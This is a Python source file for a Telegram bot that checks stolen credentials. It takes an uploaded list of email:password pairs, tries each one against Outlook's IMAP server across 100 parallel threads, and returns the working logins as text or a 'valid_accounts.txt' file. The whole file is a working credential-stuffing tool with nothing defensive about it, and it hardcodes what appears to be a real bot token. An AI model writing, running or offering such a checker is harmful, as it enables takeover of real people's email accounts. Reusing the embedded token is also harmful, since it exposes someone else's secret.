import imaplib
import asyncio
import tempfile
import concurrent.futures
from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

# ======= CONFIG =======
BOT_TOKEN = "7972084087:AAHegIMJg6CIQ4jkz8gHF1IXWLNOAkTuF9Q"
MAX_WORKERS = 100
user_states = {}

# ======= IMAP CHECKING =======
def check_imap_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
        mail.login(email, password)
        mail.logout()
        return (email, password, True)
    except Exception:
        return (email, password, False)

def parse_file(file_path):
    with open(file_path, 'r') as f:
        return [line.strip().split(":", 1) for line in f if ":" in line]

async def check_accounts(credentials):
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = [loop.run_in_executor(executor, check_imap_login, email, password)
                 for email, password in credentials]
        return await asyncio.gather(*tasks)

# ======= TELEGRAM HANDLERS =======
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please send a file with `email:password` per line.")
    user_states[update.effective_chat.id] = {"stage": "awaiting_file"}

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if user_states.get(chat_id, {}).get("stage") != "awaiting_file":
        return

    document: Document = update.message.document
    file = await context.bot.get_file(document.file_id)

    with tempfile.NamedTemporaryFile(delete=False) as tf:
        await file.download_to_drive(tf.name)
        credentials = parse_file(tf.name)

    await update.message.reply_text(f"Checking {len(credentials)} accounts...")

    results = await check_accounts(credentials)
    valids = [(email, password) for email, password, success in results if success]

    user_states[chat_id] = {
        "stage": "awaiting_output_choice",
        "valids": valids,
    }

    await update.message.reply_text(
        f"✅ Found {len(valids)} valid accounts.\nReturn result as text or file? (Reply with `text` or `file`)"
    )

async def handle_text_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    state = user_states.get(chat_id)
    if not state or state.get("stage") != "awaiting_output_choice":
        return

    valids = state["valids"]
    choice = update.message.text.strip().lower()

    if not valids:
        await update.message.reply_text("❌ No valid accounts found.")
        user_states.pop(chat_id, None)
        return

    if choice == "text":
        output = "\n".join(f"{e}:{p}" for e, p in valids)
        await update.message.reply_text(output[:4096])  # Telegram max message size
    elif choice == "file":
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt") as tf:
            for e, p in valids:
                tf.write(f"{e}:{p}\n")
            tf.flush()
            await update.message.reply_document(document=open(tf.name, "rb"), filename="valid_accounts.txt")
    else:
        await update.message.reply_text("Please reply with `text` or `file`.")
        return

    user_states.pop(chat_id, None)

# ======= START BOT =======
async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_response))

    print("Bot is running via polling...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
